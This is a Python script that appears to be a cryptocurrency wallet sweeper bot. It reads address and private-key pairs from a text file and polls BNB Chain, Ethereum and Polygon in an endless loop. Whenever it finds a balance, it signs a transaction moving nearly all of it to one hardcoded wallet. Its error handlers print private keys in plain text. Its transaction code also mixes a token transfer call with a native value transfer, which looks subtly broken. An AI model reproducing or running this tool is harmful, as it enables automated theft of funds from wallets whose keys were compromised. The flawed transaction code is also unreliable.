from time import sleep
from web3 import Web3

from config import wallet
from abi import *

def readfile():
    with open('wallets.txt', 'r') as f:
        content = f.readlines()
        lines = [line.rstrip('\n') for line in content]
        print('Wallets: ' + str(len(lines)))
        return lines


def get_balance(web3, contract_address):
    amount = web3.eth.get_balance(contract_address)
    if amount != 0:
        return amount
    else:
        pass


def send_money(web3, contract_address, private_key, amount, chainid):
    price = web3.toWei(5, 'gwei')
    if chainid == 1:
        price = web3.toWei(20, 'gwei')
    nonce = web3.eth.getTransactionCount(contract_address)
    contract = web3.eth.contract(address=wallet, abi=abi)
    token_tx = contract.functions.transfer(wallet, amount).buildTransaction({
        'chainId': chainid,
        'value': amount - price * 22000,
        'gas': 22000,
        'gasPrice': price,
        'nonce': nonce})
    sign_txn = web3.eth.account.signTransaction(token_tx, private_key=private_key)
    web3.eth.sendRawTransaction(sign_txn.rawTransaction)
    print(f"Transaction has been sent to: {wallet}")
    sleep(7)


def main(lines):
    while True:
        for line in lines:
            contract_address = line.split(',')[0]
            private_key = line.split(',')[1]
            contract_address = Web3.toChecksumAddress(contract_address)
            try:
                api = 'https://bsc-dataseed.binance.org'
                web3 = Web3(Web3.HTTPProvider(api))
                balance = get_balance(web3, contract_address)
                if type(balance) == int:
                    if balance > web3.toWei(5, 'gwei') * 22000:
                        print('BNB: Balance detected!')
                        send_money(web3, contract_address, private_key, balance, chainid=56)
                    else:
                        pass
                else:
                    pass
            except:
                print("Issue with wallet", contract_address, private_key)
                pass
            try:
                api = "https://eth-mainnet.public.blastapi.io"
                web3 = Web3(Web3.HTTPProvider(api))
                balance = get_balance(web3, contract_address)
                if type(balance) == int:
                    if balance > web3.toWei(5, 'gwei') * 22000:
                        print('ETH: Balance detected!')
                        send_money(web3, contract_address, private_key, balance,chainid=1)
                    else:
                        pass
                else:
                    pass
            except Exception as ex:
                print(ex)
                print("Issue with wallet", contract_address, private_key)
                pass
            try:
                api = "https://matic-mainnet-full-rpc.bwarelabs.com"
                web3 = Web3(Web3.HTTPProvider(api))
                balance = get_balance(web3, contract_address)
                if type(balance) == int:
                    if balance > web3.toWei(5, 'gwei') * 22000:
                        print('MATIC: Balance detected!')
                        send_money(web3, contract_address, private_key, balance, chainid=137)
                    else:
                        pass
                else:
                    pass
            except Exception as ex:
                print(ex)
                print("Issue with wallet", contract_address, private_key)
                pass
if __name__ == "__main__":
    main(readfile())
